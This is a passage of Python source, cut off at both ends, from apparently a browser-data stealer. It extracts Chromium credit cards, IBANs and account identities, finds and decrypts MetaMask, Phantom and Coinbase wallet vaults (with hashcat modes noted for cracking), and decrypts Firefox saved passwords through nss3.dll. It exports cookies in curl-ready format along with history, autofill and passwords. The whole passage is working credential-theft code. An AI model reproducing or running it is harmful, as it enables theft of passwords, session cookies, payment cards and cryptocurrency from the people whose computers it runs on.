                            drops.add("cards", "decrypt_fail", guid=guid)
                    else:
                        number = dec.decode("utf-8", errors="replace")
                cards.append({
                    "name_on_card": d.get("name_on_card", "") or "",
                    "number": number,
                    "exp_month": int(d.get("expiration_month", 0) or 0),
                    "exp_year": int(d.get("expiration_year", 0) or 0),
                    "nickname": d.get("nickname", "") or "",
                    "origin": d.get("origin", "") or "",
                    "billing_address_id": d.get("billing_address_id", "") or "",
                    "card_encrypted": bool(enc) and not number,
                })
        cur.execute("PRAGMA table_info(local_ibans)")
        icols = {r[1] for r in cur.fetchall()}
        if icols:
            cur.execute("SELECT * FROM local_ibans")
            desc = [d[0] for d in cur.description]
            for row in cur.fetchall():
                d = dict(zip(desc, row))
                enc = d.get("value_encrypted") or d.get("iban_encrypted")
                val = ""
                if enc:
                    dec = _dec_card(enc, d.get("guid", ""), abe, dpapi)
                    if dec is not None:
                        val = dec.decode("utf-8", errors="replace")
                ibans.append({"nickname": d.get("nickname", "") or "",
                              "value": val,
                              "encrypted": bool(enc) and not val})
        con.close()
    except sqlite3.Error as exc:
        drops.add("cards", "query_failed", db=db, err=str(exc))
    finally:
        _rm_db(tmp)
    return {"cards": cards, "ibans": ibans}


def _chromium_account_info(profile_dir: str, user_data: str) -> dict:
    out = {
        "email": "", "full_name": "", "display_name": "",
        "gaia": "", "account_id": "", "picture_url": "",
        "signed_in": False, "sources": []
    }

    pref_path = os.path.join(profile_dir, "Preferences")
    if os.path.isfile(pref_path):
        try:
            with open(pref_path, "r", encoding="utf-8") as f:
                pref = json.load(f)
        except Exception:
            pref = {}
        info = pref.get("account_info") or []
        if isinstance(info, list) and info and isinstance(info[0], dict):
            a = info[0]
            email = a.get("email", "") or ""
            if email:
                out["email"] = email
                out["full_name"] = a.get("full_name", "") or ""
                out["gaia"] = a.get("gaia", "") or ""
                out["account_id"] = a.get("account_id", "") or ""
                out["picture_url"] = a.get("picture_url", "") or ""
                out["signed_in"] = True
                out["sources"].append("Preferences.account_info")

    if not out["email"]:
        state_path = os.path.join(user_data, "Local State")
        prof_name = os.path.basename(os.path.normpath(profile_dir))
        if os.path.isfile(state_path):
            try:
                with open(state_path, "r", encoding="utf-8") as f:
                    state = json.load(f)
            except Exception:
                state = {}
            cache = (state.get("profile", {}) or {}).get("info_cache", {}) or {}
            entry = cache.get(prof_name) or {}
            if isinstance(entry, dict):
                un = entry.get("user_name", "") or ""
                if un and un != "unknown":
                    out["email"] = un
                    out["full_name"] = entry.get("gaia_name", "") or out["full_name"]
                    out["gaia"] = entry.get("gaia_id", "") or out["gaia"]
                    out["picture_url"] = entry.get("avatar_icon", "") or out["picture_url"]
                    out["signed_in"] = True
                    out["sources"].append("Local State.profile.info_cache")

    return out


def _ls_decode_key(k: bytes) -> Optional[Tuple[str, str]]:
    if not k.startswith(b"_"):
        return None
    rest = k[1:]
    idx = rest.find(b"\x00")
    if idx < 0:
        return None
    origin = rest[:idx].decode("utf-8", errors="replace")
    key_part = rest[idx + 1:]
    if key_part and key_part[0] in (0, 1):
        key_part = key_part[1:]

    if b"\x00" in key_part[:20]:
        try:
            key = key_part.decode("utf-16-le")
        except UnicodeDecodeError:
            key = key_part.decode("utf-8", errors="replace")
    else:
        try:
            key = key_part.decode("utf-8")
        except UnicodeDecodeError:
            try:
                key = key_part.decode("utf-16-le")
            except Exception:
                return None
    return origin, key


def _ls_decode_value(v: bytes) -> str:
    if not v:
        return ""
    prefix = v[0]
    payload = v[1:] if prefix in (0, 1) else v

    if b"\x00" in payload[:20]:
        try:
            return payload.decode("utf-16-le")
        except UnicodeDecodeError:
            pass
    try:
        return payload.decode("utf-8")
    except UnicodeDecodeError:
        pass
    try:
        return payload.decode("utf-16-le")
    except UnicodeDecodeError:
        pass
    try:
        return payload.decode("latin-1")
    except Exception:
        return "<binary:" + str(len(v)) + " bytes>"


def _chromium_local_storage(profile_dir: str, drops: Drops,
                            important_only: bool = False) -> List[dict]:
    ld = os.path.join(profile_dir, "Local Storage", "leveldb")
    if not os.path.isdir(ld):
        return []
    entries = _read_leveldb(ld)
    out: List[dict] = []
    for k, v in entries:
        if not k.startswith(b"_"):
            continue
        decoded = _ls_decode_key(k)
        if decoded is None:
            drops.add("local_storage", "bad_key",
                      preview=k[:40].hex())
            continue
        origin, key = decoded
        value = _ls_decode_value(v)
        if important_only and not _is_important_ls(origin, key, value):
            drops.add("local_storage", "skipped_not_important",
                      origin=origin, key=key[:60])
            continue
        out.append({"origin": origin, "key": key, "value": value})
    return out


def _chromium_bookmarks(profile_dir: str) -> Optional[dict]:
    path = os.path.join(profile_dir, "Bookmarks")
    if not os.path.isfile(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def _chromium_preferences(profile_dir: str) -> Optional[dict]:
    path = os.path.join(profile_dir, "Preferences")
    if not os.path.isfile(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def _chromium_extension_list(profile_dir: str) -> List[dict]:
    ext_root = os.path.join(profile_dir, "Extensions")
    if not os.path.isdir(ext_root):
        return []
    out = []
    for ext_id in sorted(os.listdir(ext_root)):
        ext_path = os.path.join(ext_root, ext_id)
        if not os.path.isdir(ext_path):
            continue
        versions = [d for d in os.listdir(ext_path)
                    if os.path.isdir(os.path.join(ext_path, d))]
        if not versions:
            continue
        latest = sorted(versions, key=lambda x: [
            int(y) if y.isdigit() else 0 for y in x.replace("_", ".").split(".")
        ])[-1]
        manifest_path = os.path.join(ext_path, latest, "manifest.json")
        manifest = None
        if os.path.isfile(manifest_path):
            try:
                with open(manifest_path, "r", encoding="utf-8") as f:
                    manifest = json.load(f)
            except Exception:
                manifest = None
        name = ""
        description = ""
        permissions: List[str] = []
        if isinstance(manifest, dict):
            name = manifest.get("name", "") or ""
            if name.startswith("__MSG_"):
                name_loc = _resolve_ext_locale_name(
                    os.path.dirname(manifest_path), name)
                if name_loc:
                    name = name_loc
            description = manifest.get("description", "") or ""
            permissions = list(manifest.get("permissions", []) or [])
            permissions += list(manifest.get("host_permissions", []) or [])
        out.append({
            "id": ext_id,
            "version": latest,
            "name": name,
            "description": description,
            "permissions": permissions,
            "wallet": _WALLET_EXTENSIONS.get(ext_id),
            "path": ext_path,
            "manifest_path": manifest_path,
        })
    return out


def _resolve_ext_locale_name(ext_dir: str, msg_key: str) -> Optional[str]:
    if not msg_key.startswith("__MSG_") or not msg_key.endswith("__"):
        return None
    key = msg_key[6:-2]
    locales_dir = os.path.join(ext_dir, "_locales")
    if not os.path.isdir(locales_dir):
        return None
    candidates = ["en", "en_US", "en_GB"]
    for loc in candidates:
        p = os.path.join(locales_dir, loc, "messages.json")
        if not os.path.isfile(p):
            continue
        try:
            with open(p, "r", encoding="utf-8") as f:
                data = json.load(f)
            if key in data and "message" in data[key]:
                return data[key]["message"]
        except Exception:
            continue
    return None


def _chromium_extension_storage(profile_dir: str, ext_id: str
                                ) -> List[Tuple[str, str, bytes]]:
    ld = os.path.join(profile_dir, "Local Extension Settings", ext_id)
    if not os.path.isdir(ld):
        return []
    entries = _read_leveldb(ld)
    out = []
    for k, v in entries:
        key = k.decode("utf-8", errors="replace")
        try:
            vs = v.decode("utf-8")
            try:
                parsed = json.loads(vs)
                val_out = json.dumps(parsed, indent=2, ensure_ascii=False)
            except (ValueError, TypeError):
                val_out = vs
        except UnicodeDecodeError:
            val_out = "<binary:" + str(len(v)) + " bytes>"
        out.append((key, val_out, v))
    return out


def _pbkdf2(password: str, salt: bytes, iterations: int,
            dklen: int = 32) -> bytes:
    return hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"),
                                salt, iterations, dklen=dklen)


def _try_gcm(key: bytes, iv: bytes, ct: bytes) -> Optional[bytes]:
    try:
        AES = _get_aes()
        c = AES.new(key, AES.MODE_GCM, nonce=iv)
        return c.decrypt_and_verify(ct[:-16], ct[-16:])
    except Exception:
        return None


def _try_cbc(key: bytes, iv: bytes, ct: bytes) -> Optional[bytes]:
    try:
        AES = _get_aes()
        c = AES.new(key, AES.MODE_CBC, iv=iv)
        pt = c.decrypt(ct)
        pad = pt[-1]
        if 1 <= pad <= 16 and pt[-pad:] == bytes([pad]) * pad:
            return pt[:-pad]
        return None
    except Exception:
        return None


def _bytes_from_str(s) -> Optional[bytes]:
    if not s:
        return None
    if isinstance(s, bytes):
        return s
    try:
        return base64.b64decode(s, validate=False)
    except Exception:
        pass
    try:
        return bytes.fromhex(s)
    except Exception:
        return None


def _decrypt_metamask(payload: dict, password: str) -> Optional[dict]:
    vault = payload.get("vault") if isinstance(payload.get("vault"), dict) \
        else payload
    data_b = _bytes_from_str(vault.get("data"))
    iv_b = _bytes_from_str(vault.get("iv"))
    salt_b = _bytes_from_str(vault.get("salt"))
    if not (data_b and iv_b and salt_b):
        return None
    km = vault.get("keyMetadata", {}) or {}
    try:
        iters = int(km.get("params", {}).get("iterations", 600000))
    except Exception:
        iters = 600000
    key = _pbkdf2(password, salt_b, iters, 32)
    pt = _try_gcm(key, iv_b, data_b)
    if pt is None:
        return None
    try:
        return json.loads(pt.decode("utf-8"))
    except Exception:
        return {"_raw": pt.decode("latin-1", errors="replace")}


def _decrypt_phantom(payload: dict, password: str) -> Optional[dict]:
    vault = payload.get("vault") if isinstance(payload.get("vault"), dict) \
        else payload
    enc = _bytes_from_str(vault.get("encrypted")) or \
          _bytes_from_str(vault.get("data")) or \
          _bytes_from_str(vault.get("ciphertext"))
    salt = _bytes_from_str(vault.get("salt"))
    iv = _bytes_from_str(vault.get("iv")) or \
         _bytes_from_str(vault.get("nonce"))
    if not (enc and salt and iv):
        return None
    try:
        iters = int(vault.get("iterations") or vault.get("iteration")
                     or 100000)
    except Exception:
        iters = 100000
    key = _pbkdf2(password, salt, iters, 32)
    for fn in (_try_gcm, _try_cbc):
        pt = fn(key, iv, enc)
        if pt is not None:
            try:
                return json.loads(pt.decode("utf-8"))
            except Exception:
                return {"_raw": pt.decode("latin-1", errors="replace")}
    return None


def _decrypt_coinbase(payload: dict, password: str) -> Optional[dict]:
    vault = payload.get("vault") if isinstance(payload.get("vault"), dict) \
        else payload
    enc = _bytes_from_str(vault.get("value")) or \
          _bytes_from_str(vault.get("encrypted")) or \
          _bytes_from_str(vault.get("ciphertext")) or \
          _bytes_from_str(vault.get("data"))
    salt = _bytes_from_str(vault.get("salt"))
    iv = _bytes_from_str(vault.get("iv")) or \
         _bytes_from_str(vault.get("nonce"))
    if not (enc and salt and iv):
        return None
    try:
        iters = int(vault.get("iterations") or 100000)
    except Exception:
        iters = 100000
    key = _pbkdf2(password, salt, iters, 32)
    for fn in (_try_gcm, _try_cbc):
        pt = fn(key, iv, enc)
        if pt is not None:
            try:
                return json.loads(pt.decode("utf-8"))
            except Exception:
                return {"_raw": pt.decode("latin-1", errors="replace")}
    return None


def _decrypt_generic(payload: dict, password: str) -> Optional[dict]:
    return (_decrypt_metamask(payload, password)
            or _decrypt_phantom(payload, password))


_WALLET_DECRYPTORS = {
    "metamask": _decrypt_metamask,
    "phantom": _decrypt_phantom,
    "coinbase": _decrypt_coinbase,
    "rabby": _decrypt_metamask,
    "trust": _decrypt_coinbase,
    "generic": _decrypt_generic,
}


def _scan_json_blobs(blob: bytes, max_size: int = 4 * 1024 * 1024
                     ) -> List[dict]:
    if not blob or len(blob) > max_size:
        return []
    out: List[dict] = []
    try:
        text = blob.decode("latin-1", errors="ignore")
    except Exception:
        return []
    i = 0
    while i < len(text):
        if text[i] != "{":
            i += 1
            continue
        depth = 0
        in_str = False
        esc = False
        end = -1
        for j in range(i, len(text)):
            ch = text[j]
            if esc:
                esc = False
                continue
            if ch == "\\":
                esc = True
                continue
            if ch == '"':
                in_str = not in_str
                continue
            if in_str:
                continue
            if ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    end = j
                    break
        if end < 0:
            i += 1
            continue
        try:
            obj = json.loads(text[i:end + 1])
            if isinstance(obj, dict):
                out.append(obj)
        except Exception:
            pass
        i = end + 1
    return out


def _walk_for_vaults(obj, depth: int = 0) -> List[dict]:
    out: List[dict] = []
    if depth > 6:
        return out
    if isinstance(obj, dict):
        keys_lower = {str(k).lower() for k in obj.keys()}
        has_c = bool(keys_lower & _VAULT_CIPHER_FIELDS)
        has_k = bool(keys_lower & _VAULT_KDF_FIELDS)
        if has_c and has_k:
            out.append(obj)
        for k, v in obj.items():
            kl = str(k).lower()
            if kl in ("vault", "encryptedvault", "ciphervault", "vaultdata"):
                if isinstance(v, dict) and v:
                    out.append(v)
                    out.extend(_walk_for_vaults(v, depth + 1))
            elif isinstance(v, (dict, list)):
                out.extend(_walk_for_vaults(v, depth + 1))
    elif isinstance(obj, list):
        for item in obj:
            out.extend(_walk_for_vaults(item, depth + 1))
    return out


def _find_vault_candidates(profile_dir: str, ext_id: str) -> List[dict]:
    candidates: List[dict] = []
    ld = os.path.join(profile_dir, "Local Extension Settings", ext_id)
    if os.path.isdir(ld):
        for _k, v in _read_leveldb(ld):
            try:
                obj = json.loads(v.decode("utf-8"))
                candidates.extend(_walk_for_vaults(obj))
            except Exception:
                for found in _scan_json_blobs(v):
                    candidates.extend(_walk_for_vaults(found))
    idb = os.path.join(profile_dir, "IndexedDB",
                       "chrome-extension_" + ext_id + "_0.indexeddb.leveldb")
    if os.path.isdir(idb):
        for _k, v in _read_leveldb(idb):
            for found in _scan_json_blobs(v):
                candidates.extend(_walk_for_vaults(found))
    seen: set = set()
    uniq: List[dict] = []
    for c in candidates:
        try:
            fp = hashlib.sha256(
                json.dumps(c, sort_keys=True, default=str)
                .encode("utf-8")).digest()
        except Exception:
            fp = repr(c).encode("utf-8", errors="replace")
        if fp in seen:
            continue
        seen.add(fp)
        uniq.append(c)
    return uniq


def _write_wallets(profile_out: str, profile_dir: str,
                   wallet_password: Optional[str],
                   drops: Drops) -> List[dict]:
    results: List[dict] = []
    for ext_id, info in _WALLET_REGISTRY.items():
        name = info["name"]
        scheme = info.get("scheme", "generic")
        candidates = _find_vault_candidates(profile_dir, ext_id)
        if not candidates:
            continue

        wdir = os.path.join(profile_out, "wallets", _safe_domain(name))
        os.makedirs(wdir, exist_ok=True)

        saved = 0
        for i, c in enumerate(candidates):
            fn = "vault.json" if len(candidates) == 1 else f"vault_{i}.json"
            try:
                with open(os.path.join(wdir, fn), "w",
                          encoding="utf-8") as f:
                    json.dump(c, f, ensure_ascii=False, indent=2)
                saved += 1
            except Exception:
                pass

        ld_src = os.path.join(profile_dir, "Local Extension Settings", ext_id)
        if os.path.isdir(ld_src):
            raw_ld = os.path.join(wdir, "raw_local_extension_settings")
            os.makedirs(raw_ld, exist_ok=True)
            for fname in os.listdir(ld_src):
                sp = os.path.join(ld_src, fname)
                if os.path.isfile(sp):
                    _copy_file(sp, os.path.join(raw_ld, fname))

        idb_src = os.path.join(profile_dir, "IndexedDB",
                               "chrome-extension_" + ext_id
                               + "_0.indexeddb.leveldb")
        if os.path.isdir(idb_src):
            raw_idb = os.path.join(wdir, "raw_indexeddb")
            _copy_dir(idb_src, raw_idb)

        entry = {
            "wallet": name, "ext_id": ext_id, "scheme": scheme,
            "vaults_found": saved,
            "hashcat_mode": info.get("hashcat_mode"),
            "decrypted": False,
        }

        if wallet_password and candidates:
            decrypter = _WALLET_DECRYPTORS.get(scheme, _decrypt_generic)
            for i, c in enumerate(candidates):
                pt = decrypter(c, wallet_password)
                if pt is None:
                    drops.add("crypto", "decrypt_failed",
                              wallet=name, candidate=i)
                    continue
                fn = ("decrypted.json" if len(candidates) == 1
                      else f"decrypted_{i}.json")
                try:
                    with open(os.path.join(wdir, fn), "w",
                              encoding="utf-8") as f:
                        json.dump(pt, f, ensure_ascii=False, indent=2)
                    entry["decrypted"] = True
                except Exception:
                    pass

        results.append(entry)
    return results


def _firefox_profiles(base: str) -> List[str]:
    if not os.path.isdir(base):
        return []
    return [n for n in sorted(os.listdir(base))
            if os.path.isdir(os.path.join(base, n))
            and any(os.path.isfile(os.path.join(base, n, x))
                    for x in ("cookies.sqlite", "logins.json",
                              "places.sqlite", "signedInUser.json",
                              "prefs.js"))]


def _firefox_cookies(prof_dir: str, drops: Drops,
                     retries: int = DEFAULT_RETRIES
                     ) -> Tuple[List[dict], bool, bool]:
    db = os.path.join(prof_dir, "cookies.sqlite")
    if not os.path.isfile(db):
        return [], True, False
    tmp, wal_ok = _safe_copy(db, retries)
    if not tmp:
        drops.add("cookie", "copy_failed", db=db)
        return [], True, True
    res = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT host, name, value, path, expiry, isSecure, "
                    "isHttpOnly FROM moz_cookies")
        for h, n, v, p, e, s, ht in cur.fetchall():
            if not v:
                continue
            try:
                vb = v.encode("utf-8") if isinstance(v, str) else v
            except Exception:
                continue
            res.append({"host": h or "", "name": n or "", "value": vb,
                        "path": p or "/", "expires_unix": int(e or 0),
                        "secure": bool(s), "httponly": bool(ht)})
        con.close()
    finally:
        _rm_db(tmp)
    return res, wal_ok, False


def _firefox_history(prof_dir: str, drops: Drops,
                     retries: int = DEFAULT_RETRIES) -> List[dict]:
    db = os.path.join(prof_dir, "places.sqlite")
    if not os.path.isfile(db):
        return []
    rows, _wal, _cf = _query_db(
        db,
        "SELECT url, title, visit_count, last_visit_date "
        "FROM moz_places WHERE visit_count > 0 "
        "ORDER BY last_visit_date DESC",
        drops, "history", retries)
    out = []
    for url, title, vc, t in rows:
        t_unix = 0
        try:
            if t:
                t_unix = int(t) // 1000000
        except Exception:
            t_unix = 0
        out.append({"url": url or "", "title": title or "",
                    "visit_count": int(vc or 0),
                    "last_visit_unix": t_unix})
    return out


def _firefox_bookmarks(prof_dir: str, drops: Drops,
                       retries: int = DEFAULT_RETRIES) -> List[dict]:
    db = os.path.join(prof_dir, "places.sqlite")
    if not os.path.isfile(db):
        return []
    tmp, wal_ok = _safe_copy(db, retries)
    if not tmp:
        drops.add("bookmarks", "copy_failed", db=db)
        return []
    out = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute(
            "SELECT b.title, p.url, b.dateAdded "
            "FROM moz_bookmarks b "
            "LEFT JOIN moz_places p ON p.id = b.fk "
            "WHERE b.type = 1 ORDER BY b.dateAdded DESC")
        for title, url, added in cur.fetchall():
            if not url:
                continue
            out.append({"title": title or "", "url": url,
                        "date_added_us": int(added or 0)})
        con.close()
    except sqlite3.Error as exc:
        drops.add("bookmarks", "query_failed", db=db, err=str(exc))
    finally:
        _rm_db(tmp)
    return out


def _firefox_account_info(prof_dir: str) -> dict:
    out = {"email": "", "full_name": "", "display_name": "", "uid": "",
           "picture_url": "", "signed_in": False, "sources": []}

    sj_path = os.path.join(prof_dir, "signedInUser.json")
    if os.path.isfile(sj_path):
        try:
            with open(sj_path, "r", encoding="utf-8") as f:
                sj = json.load(f)
            acct = sj.get("accountData") or {}
            if isinstance(acct, dict):
                out["email"] = acct.get("email", "") or ""
                out["uid"] = acct.get("uid", "") or ""
                out["display_name"] = acct.get("displayName", "") or ""
                out["full_name"] = out["display_name"]
                out["picture_url"] = acct.get("avatarURL", "") or ""
                if out["email"]:
                    out["signed_in"] = True
                    out["sources"].append("signedInUser.json")
        except Exception:
            pass

    if not out["email"]:
        prefs_path = os.path.join(prof_dir, "prefs.js")
        if os.path.isfile(prefs_path):
            try:
                with open(prefs_path, "r", encoding="utf-8",
                          errors="replace") as f:
                    for line in f:
                        if "services.sync.username" in line:
                            m = re.search(r'"([^"@]+@[^"]+)"', line)
                            if m:
                                out["email"] = m.group(1)
                                out["signed_in"] = True
                                out["sources"].append("prefs.js")
                                break
            except Exception:
                pass

    return out


def _find_nss_dir() -> Optional[str]:
    for base in NSS_SEARCH:
        if not os.path.isdir(base):
            continue
        if os.path.isfile(os.path.join(base, "nss3.dll")):
            return base
        for root, _, files in os.walk(base):
            if "nss3.dll" in files:
                return root
    return None


_NSS_LOCK = threading.Lock()


class _SECItem(ctypes.Structure):
    _fields_ = [
        ("type", ctypes.c_uint),
        ("data", ctypes.c_void_p),
        ("len",  ctypes.c_uint),
    ]


def _nss_dec(nss, b64: str) -> str:
    if not b64:
        return ""
    try:
        raw = base64.b64decode(b64)
    except Exception:
        return ""
    if not raw:
        return ""
    buf = ctypes.create_string_buffer(raw, len(raw))
    i = _SECItem(0, ctypes.cast(buf, ctypes.c_void_p), len(raw))
    o = _SECItem()
    if nss.PK11SDR_Decrypt(ctypes.byref(i), ctypes.byref(o), None) != 0 \
       or not o.data or not o.len:
        return ""
    try:
        return ctypes.string_at(o.data, o.len).decode("utf-8",
                                                       errors="replace")
    finally:
        nss.SECITEM_FreeItem(ctypes.byref(o), 0)


def _firefox_passwords(prof_dir: str, drops: Drops) -> List[dict]:
    lj = os.path.join(prof_dir, "logins.json")
    if not os.path.isfile(lj):
        return []
    nss_dir = _find_nss_dir()
    if not nss_dir:
        drops.add("password", "no_nss", profile=prof_dir)
        return []
    with _NSS_LOCK:
        return _firefox_passwords_locked(prof_dir, lj, nss_dir, drops)


def _firefox_passwords_locked(prof_dir: str, lj: str,
                              nss_dir: str, drops: Drops) -> List[dict]:
    try:
        os.add_dll_directory(nss_dir)
    except Exception:
        pass

    try:
        nss = ctypes.WinDLL(os.path.join(nss_dir, "nss3.dll"))
    except OSError as e:
        drops.add("password", "nss_load_failed",
                  profile=prof_dir, err=str(e)[:200])
        return []

    nss.NSS_Init.argtypes = [ctypes.c_char_p]
    nss.NSS_Init.restype = ctypes.c_int
    nss.NSS_Shutdown.argtypes = []
    nss.NSS_Shutdown.restype = ctypes.c_int
    nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(_SECItem),
                                    ctypes.POINTER(_SECItem),
                                    ctypes.c_void_p]
    nss.PK11SDR_Decrypt.restype = ctypes.c_int
    nss.SECITEM_FreeItem.argtypes = [ctypes.POINTER(_SECItem), ctypes.c_int]
    nss.SECITEM_FreeItem.restype = ctypes.c_int

    if nss.NSS_Init(prof_dir.encode("utf-8")) != 0:
        drops.add("password", "nss_init_failed", profile=prof_dir)
        return []

    try:
        with open(lj, encoding="utf-8") as f:
            data = json.load(f)
        out: List[dict] = []
        for e in data.get("logins", []):
            u = _nss_dec(nss, e.get("encryptedUsername", ""))
            p = _nss_dec(nss, e.get("encryptedPassword", ""))
            if p:
                out.append({"url": e.get("hostname", ""),
                            "username": u,
                            "password": p})
        return out
    except Exception as e:
        drops.add("password", "parse_failed",
                  profile=prof_dir, err=str(e)[:200])
        return []
    finally:
        try:
            nss.NSS_Shutdown()
        except Exception:
            pass
# ─────────────────────────────────────────────────────────────────────


_NS_HEADER = (b"# Netscape HTTP Cookie File\n"
              b"# https://curl.se/docs/http-cookies.html\n\n")


def _ns_line(c: dict) -> bytes:
    host = c["host"].encode("utf-8", errors="replace")
    isub = b"TRUE" if c["host"].startswith(".") else b"FALSE"
    path = c["path"].encode("utf-8", errors="replace")
    sec = b"TRUE" if c["secure"] else b"FALSE"
    exp = str(int(c.get("expires_unix") or 0)).encode()
    name = c["name"].encode("utf-8", errors="replace")
    val = c["value"].replace(b"\t", b"%09") \
                    .replace(b"\n", b"%0A") \
                    .replace(b"\r", b"%0D")
    return b"\t".join([host, isub, path, sec, exp, name, val]) + b"\n"


def _write_cookies(profile_out: str, cookies: List[dict],
                   fmt: str = COOKIE_FORMAT) -> None:
    if not cookies:
        return

    if fmt == "json":
        path = os.path.join(profile_out, "cookies.json")
        os.makedirs(profile_out, exist_ok=True)
        payload = []
        for c in cookies:
            payload.append({
                "host": c["host"], "name": c["name"],
                "value": c["value"].decode("utf-8", errors="replace"),
                "path": c["path"], "expires_unix": c["expires_unix"],
                "secure": c["secure"], "httponly": c["httponly"],
            })
        with open(path, "w", encoding="utf-8") as f:
            json.dump(payload, f, ensure_ascii=False, indent=2)
        return

    if fmt == "csv":
        path = os.path.join(profile_out, "cookies.csv")
        os.makedirs(profile_out, exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f)
            w.writerow(["host", "name", "value", "path",
                        "expires_unix", "secure", "httponly"])
            for c in cookies:
                w.writerow([
                    c["host"], c["name"],
                    c["value"].decode("utf-8", errors="replace"),
                    c["path"], c["expires_unix"],
                    int(c["secure"]), int(c["httponly"]),
                ])
        return

    cdir = os.path.join(profile_out, "cookies")
    os.makedirs(cdir, exist_ok=True)
    by: Dict[str, List[dict]] = {}
    for c in cookies:
        by.setdefault(c["host"], []).append(c)
    for host, cs in by.items():
        with open(os.path.join(cdir, _safe_domain(host) + ".txt"), "wb") as f:
            f.write(_NS_HEADER)
            for c in sorted(cs, key=lambda x: (x["path"], x["name"])):
                f.write(_ns_line(c))


def _tsv(s) -> str:
    if s is None:
        return ""
    return (str(s).replace("\\", "\\\\")
            .replace("\t", "\\t")
            .replace("\n", "\\n")
            .replace("\r", "\\r"))


def _write_passwords(profile_out: str, passwords: List[dict],
                     fmt: str = PASSWORD_FORMAT) -> None:
    if not passwords:
        return

    if fmt == "json":
        path = os.path.join(profile_out, "passwords.json")
        os.makedirs(profile_out, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(passwords, f, ensure_ascii=False, indent=2)
        return

    if fmt == "csv":
        path = os.path.join(profile_out, "passwords.csv")
        os.makedirs(profile_out, exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f)
            w.writerow(["url", "username", "password"])
            for e in passwords:
                w.writerow([e["url"], e["username"], e["password"]])
        return

    pdir = os.path.join(profile_out, "passwords")
    os.makedirs(pdir, exist_ok=True)
    by: Dict[str, List[dict]] = {}
    for p in passwords:
        by.setdefault(_url_domain(p["url"]), []).append(p)
    for dom, ents in by.items():
        with open(os.path.join(pdir, _safe_domain(dom) + ".txt"),
                  "w", encoding="utf-8", newline="\n") as f:
            for e in ents:
                f.write(f"{_tsv(e['url'])}\t{_tsv(e['username'])}\t"
                        f"{_tsv(e['password'])}\n")


def _write_history(profile_out: str, entries: List[dict],
                   fmt: str = "tsv") -> None:
    if not entries:
        return
    os.makedirs(profile_out, exist_ok=True)
    if fmt == "json":
        with open(os.path.join(profile_out, "history.json"),
                  "w", encoding="utf-8") as f:
            json.dump(entries, f, ensure_ascii=False, indent=2)
        return
    if fmt == "csv":
        with open(os.path.join(profile_out, "history.csv"),
                  "w", encoding="utf-8", newline="") as f:
            w = csv.writer(f)
            w.writerow(["last_visit_unix", "visit_count", "url", "title"])
            for e in entries:
                w.writerow([e["last_visit_unix"], e["visit_count"],
                            e["url"], e["title"]])
        return
    with open(os.path.join(profile_out, "history.txt"),
              "w", encoding="utf-8", newline="\n") as f:
        f.write("last_visit_unix\tvisit_count\turl\ttitle\n")
        for e in entries:
            f.write(f"{e['last_visit_unix']}\t{e['visit_count']}\t"
                    f"{_tsv(e['url'])}\t{_tsv(e['title'])}\n")


def _write_autofill(profile_out: str, data: dict,
                    fmt: str = "tsv") -> None:
    fields = data.get("fields", [])
    profiles = data.get("profiles", [])
    if not fields and not profiles:
        return
    os.makedirs(profile_out, exist_ok=True)

    if fmt == "json":
        with open(os.path.join(profile_out, "autofill.json"),
                  "w", encoding="utf-8") as f:
            json.dump({"fields": fields, "profiles": profiles},
                      f, ensure_ascii=False, indent=2)
        return

    if fmt == "csv":
        if fields:
            with open(os.path.join(profile_out, "autofill.csv"),
                      "w", encoding="utf-8", newline="") as f:
                w = csv.writer(f)
                w.writerow(["count", "name", "value"])
                for e in fields:
                    w.writerow([e["count"], e["name"], e["value"]])
        if profiles:
            with open(os.path.join(profile_out, "autofill_profiles.csv"),
                      "w", encoding="utf-8", newline="") as f:
                w = csv.writer(f)
                w.writerow(["guid", "names", "emails", "phones",
                            "company", "street", "city", "state",
                            "zip", "country", "use_count"])
                for p in profiles:
                    w.writerow([
                        p.get("guid", ""),
                        " | ".join(p.get("names", [])),
                        " | ".join(p.get("emails", [])),
                        " | ".join(p.get("phones", [])),
                        p.get("company", ""), p.get("street", ""),
                        p.get("city", ""), p.get("state", ""),
                        p.get("zip", ""), p.get("country", ""),
                        p.get("use_count", 0),
                    ])
        return

    if fields:
        with open(os.path.join(profile_out, "autofill.txt"),
                  "w", encoding="utf-8", newline="\n") as f:
            f.write("count\tname\tvalue\n")
            for e in fields:
                f.write(f"{e['count']}\t{_tsv(e['name'])}\t"
                        f"{_tsv(e['value'])}\n")
    if profiles:
        with open(os.path.join(profile_out, "autofill_profiles.txt"),
                  "w", encoding="utf-8", newline="\n") as f:
            f.write("guid\tnames\temails\tphones\tcompany\tstreet\tcity\t"
                    "state\tzip\tcountry\tuse_count\n")
            for p in profiles:
                f.write("\t".join([
                    _tsv(p.get("guid", "")),
                    _tsv(" | ".join(p.get("names", []))),
                    _tsv(" | ".join(p.get("emails", []))),
                    _tsv(" | ".join(p.get("phones", []))),
                    _tsv(p.get("company", "")),
                    _tsv(p.get("street", "")),
                    _tsv(p.get("city", "")),
                    _tsv(p.get("state", "")),
                    _tsv(p.get("zip", "")),
                    _tsv(p.get("country", "")),
                    str(p.get("use_count", 0)),
                ]) + "\n")


def _write_cards(profile_out: str, data: dict,
                 fmt: str = "tsv") -> None:
    cards = data.get("cards", [])
    ibans = data.get("ibans", [])
    if not cards and not ibans:
        return
    os.makedirs(profile_out, exist_ok=True)

    if fmt == "json":
        with open(os.path.join(profile_out, "cards.json"),
                  "w", encoding="utf-8") as f:
            json.dump({"cards": cards, "ibans": ibans},
                      f, ensure_ascii=False, indent=2)
        return

    if fmt == "csv":
        if cards:
            with open(os.path.join(profile_out, "credit_cards.csv"),
                      "w", encoding="utf-8", newline="") as f:
                w = csv.writer(f)
                w.writerow(["name_on_card", "number", "exp_month",
                            "exp_year", "nickname", "origin",
                            "billing_address_id", "encrypted_only"])
                for c in cards:
